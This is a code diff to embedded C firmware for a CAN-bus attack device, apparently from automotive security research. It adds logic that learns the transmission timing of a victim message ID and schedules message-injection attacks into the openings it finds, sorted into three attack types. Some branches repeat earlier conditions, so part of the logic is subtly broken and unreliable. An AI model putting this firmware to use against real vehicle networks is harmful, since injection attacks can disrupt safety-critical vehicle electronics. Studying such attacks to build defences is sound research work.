@@ -105,6 +105,7 @@ volatile uint8_t g_pin_2 = 0;
 
 // keep track of interrupt event times
 volatile uint32_t g_ui32LastCANIntTimer = 0;
+volatile uint32_t g_ui32PenultimateCANIntTimer = 0;
 
 // adds delay on reset
 volatile uint32_t g_offset = 0;
@@ -113,6 +114,20 @@ volatile uint32_t g_offset = 0;
 volatile uint32_t g_target_id = 0;
 volatile uint32_t g_ui32TargetXmitTime = 0;
 volatile uint8_t g_skip_attack = SKIP_ATTACK;
+
+#define NUM_PATTERN_HP (1)
+#define TYPE_I_ATTACK (1)
+#define TYPE_II_ATTACK (2)
+#define TYPE_III_ATTACK (3)
+struct pattern {
+    uint32_t time;
+    uint8_t type;
+};
+struct pattern attack_patterns[NUM_PATTERN_HP][HYPERPERIOD / TARGET_PERIOD] = {0};
+volatile int g_current_pattern = -1;
+volatile int g_current_pattern_index = 0;
+volatile int g_th = -1, g_tl = -1;
+volatile uint32_t g_hp_base = 0;
 
 // Determine the relative priorities of the TARGET_ID, TARGET_ID_2, and the highest priority message normally sent.
 #if defined(USE_CASE_ALIGN_WITH_LOWER_PRIORITY)
@@ -209,7 +224,8 @@ static inline void got_CAN_msg_interrupt(uint32_t ID)
 {
     uint32_t timer_val;
 
-    if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE)) {
+    if (g_ui32ExpCtrl & SYNC_MASK) {
+        g_ui32PenultimateCANIntTimer = g_ui32LastCANIntTimer;
         g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);
     } else {
         if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
@@ -307,6 +323,7 @@ void do_attack_injection()
         }
     }
     ++skip_cnt;
+
 }
 
 void send_messages(uint32_t count)
@@ -373,6 +390,19 @@ void send_messages(uint32_t count)
             if (g_sCAN0TxMessage_1000) {
                 CANMessageSet(CAN0_BASE, TXOBJECT_1000, g_sCAN0TxMessage_1000, MSG_OBJ_TYPE_TX);
             }
+
+            if ((g_ui32ExpCtrl & SYNC_SBA) && (g_sync == SYNC_MODE_SYNCHED) ) {
+                if (g_current_pattern < NUM_PATTERN_HP) {
+                    ++g_current_pattern;
+                }
+                g_current_pattern_index = 0;
+                g_hp_base = TimerValueGet(TIMER3_BASE, TIMER_A);
+                if (g_current_pattern >= NUM_PATTERN_HP) {
+                    uint32_t time = attack_patterns[0][g_current_pattern_index].time;    // FIXME: add optimizations
+                    TimerLoadSet(TIMER1_BASE, TIMER_A, time - TARGET_XMIT_TIME/2); // FIXME: MAGIC?
+                    TimerEnable(TIMER1_BASE, TIMER_A);
+                }
+            }
         }
     }
 
@@ -415,11 +445,27 @@ void Timer0IntHandler(void)
 void Timer1IntHandler(void)
 {
     //uint32_t count;
+    uint32_t time;
+    uint8_t type;
 
     TimerIntClear(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
-    g_tick_2 = true;
+    //g_tick_2 = true;
 
-    //TimerEnable(TIMER0_BASE, TIMER_A);
+    if ( g_current_pattern_index < (HYPERPERIOD / TARGET_PERIOD) ) {
+        type = attack_patterns[g_current_pattern][g_current_pattern_index].type;
+        g_current_pattern_index++;
+
+        time = attack_patterns[0][g_current_pattern_index].time;    // FIXME: add optimizations
+        TimerLoadSet(TIMER1_BASE, TIMER_A, time - TARGET_XMIT_TIME/2); // FIXME: MAGIC?
+        TimerEnable(TIMER1_BASE, TIMER_A);
+
+        // TODO: need to do anything else based on the "type"?
+        if (type == TYPE_I_ATTACK || type == TYPE_II_ATTACK) {
+            do_attack_injection();
+        }
+    }
+
+
 }
 
 void Timer2IntHandler(void)
@@ -427,8 +473,7 @@ void Timer2IntHandler(void)
     TimerIntClear(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
     TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
     TimerEnable(TIMER0_BASE, TIMER_A);
-    TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
-    //TimerEnable(TIMER1_BASE, TIMER_A);
+
     TimerIntDisable(TIMER2_BASE, TIMER_TIMA_TIMEOUT);
 
     if (g_sync == SYNC_MODE_INIT) {
@@ -572,7 +617,7 @@ void do_reset(int count, int count_2, uint32_t offset)
 
     if (g_ui32ExpCtrl & RESET_IMMED) {
         TimerLoadSet(TIMER0_BASE, TIMER_A, INTERVAL);
-        TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
+        //TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
         TimerLoadSet(TIMER2_BASE, TIMER_A, INTERVAL);
         g_sync = SYNC_MODE_RESET;
     } else if (g_ui32ExpCtrl & RESET_DELAY) {
@@ -604,6 +649,10 @@ void do_reset(int count, int count_2, uint32_t offset)
 
     g_last_target_rcv = 0;
     g_last_sporadic_tx = 0;
+    g_current_pattern = -1;
+    g_current_pattern_index = 0;
+    g_th = g_tl = -1;
+    g_hp_base = 0;
 
     TimerEnable(TIMER0_BASE, TIMER_A);
     //TimerEnable(TIMER1_BASE, TIMER_A);
@@ -646,8 +695,8 @@ initialize(void)
     IntEnable(INT_TIMER0A);
     TimerIntEnable(TIMER0_BASE, TIMER_TIMA_TIMEOUT);
 
-    // TIMER1 provides a second 5 ms period timer that is (semi) independent from TIMER 1
-    TimerConfigure(TIMER1_BASE, TIMER_CFG_PERIODIC);
+    // TIMER1 provides a one-shot timer
+    TimerConfigure(TIMER1_BASE, TIMER_CFG_ONE_SHOT);
     TimerLoadSet(TIMER1_BASE, TIMER_A, INTERVAL);
     IntEnable(INT_TIMER1A);
     TimerIntEnable(TIMER1_BASE, TIMER_TIMA_TIMEOUT);
@@ -687,12 +736,57 @@ do_switch(int count)
     g_skip_attack = SKIP_ATTACK_2;
 }
 
+void do_sba(int ID, int count, tCANMsgObject *msg )
+{
+    uint32_t delta, ti;
+    uint32_t xmit_time = TARGET_XMIT_TIME;
+    bool is_idle = false;
+
+    if ( g_current_pattern >= 0 && g_current_pattern < NUM_PATTERN_HP && g_current_pattern_index < (HYPERPERIOD / TARGET_PERIOD) ) {
+        if (msg) xmit_time = (((44+(msg->ui32MsgLen*8))*120000)/(BITRATE/1000)); // estimated
+        delta = g_ui32PenultimateCANIntTimer - g_ui32LastCANIntTimer;
+        ti = g_hp_base - (g_ui32LastCANIntTimer + xmit_time); // countdown timer
+        if (delta > 2*xmit_time) { // FIXME: magic value 2 to find idle vs non-idle times
+            // probably idle bus
+            is_idle = true;
+            g_th = g_tl = -1;
+        } else {
+            if (ID > TARGET_ID) {
+                // lower priority than victim
+                g_tl = ti;
+                g_th = -1;
+            } else if (ID > TARGET_ID && g_th < 0) {
+                g_th = ti;
+                g_tl = -1;
+            } else if (ID == TARGET_ID) {
+                if (g_th >= 0) {
+                    attack_patterns[g_current_pattern][g_current_pattern_index].time = g_th;
+                    attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_I_ATTACK;
+                } else if (g_th >= 0) {
+                    attack_patterns[g_current_pattern][g_current_pattern_index].time = g_tl;
+                    attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_II_ATTACK;
+                } else {
+                    attack_patterns[g_current_pattern][g_current_pattern_index].time = ti;
+                    attack_patterns[g_current_pattern][g_current_pattern_index].type = TYPE_III_ATTACK;
+                }
+                g_tl = g_th = -1;
+                g_current_pattern_index++;
+            }
+        }
+    }
+
+}
+
 void
-got_tx_message(int ID, int count)
+got_tx_message(int ID, int count, tCANMsgObject *msg)
 {
     uint32_t rec, tec;
 
     g_ui32TXMsgCount++;
+
+    if ((g_ui32ExpCtrl & SYNC_SBA) && (g_sync == SYNC_MODE_SYNCHED)) {
+        do_sba(ID, count, msg);
+    }
 
     if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
         if (PRECEDED_ID == ID && g_target_id == TARGET_ID) {
@@ -717,7 +811,7 @@ got_tx_message(int ID, int count)
 }
 
 int
-got_rx_message(int ID, int count)
+got_rx_message(int ID, int count, tCANMsgObject *msg)
 {
     int rv = count;
     uint32_t rec, tec;
@@ -729,6 +823,10 @@ got_rx_message(int ID, int count)
                 do_attack_injection();
             }
         }
+    }
+
+    if ((g_ui32ExpCtrl & SYNC_SBA) && (g_sync == SYNC_MODE_SYNCHED)) {
+        do_sba(ID, count, msg);
     }
 
     if (g_ui32ExpCtrl & DISABLE_RETRANS_RXPM) {
@@ -837,40 +935,40 @@ main(void)
                     }
                 }
             }
-            got_tx_message(TARGET_ID, count);
+            got_tx_message(TARGET_ID, count, &g_sCAN0TxMessage_Target_1);
         }
 
         if (g_bTXTarget_2) {
             g_bTXTarget_2 = false;
-            got_tx_message(TARGET_ID_2, count);
+            got_tx_message(TARGET_ID_2, count, &g_sCAN0TxMessage_Target_2);
         }
 
         if (g_bTXFlag_5) {
             g_bTXFlag_5 = false;
-            got_tx_message(TX_5_ID, count);
+            got_tx_message(TX_5_ID, count, g_sCAN0TxMessage_5);
         }
 
         if (g_bTXFlag_10) {
             g_bTXFlag_10 = false;
             g_ui32TXMsgCount++;
-            got_tx_message(TX_10_ID, count);
+            got_tx_message(TX_10_ID, count, g_sCAN0TxMessage_10);
         }
 
         if (g_bTXFlag_100) {
             g_bTXFlag_100 = false;
-            got_tx_message(TX_100_ID, count);
+            got_tx_message(TX_100_ID, count, g_sCAN0TxMessage_100);
         }
 
         if (g_bTXFlag_1000) {
             g_bTXFlag_1000 = false;
             g_ui32TXMsgCount++;
-            got_tx_message(TX_1000_ID, count);
+            got_tx_message(TX_1000_ID, count, g_sCAN0TxMessage_1000);
         }
 
         if (g_bTXFlag) {
             g_bTXFlag = false;
             g_ui32TXMsgCount++;
-            got_tx_message(0, count);
+            got_tx_message(0, count, NULL);
         }
 
         if (g_bRXFlag) {
@@ -894,7 +992,7 @@ main(void)
                 continue;
             }
 
-            count = got_rx_message(msg_id, count);
+            count = got_rx_message(msg_id, count, &g_sCAN0RxMessage);
 
         } // g_bRXflag
 
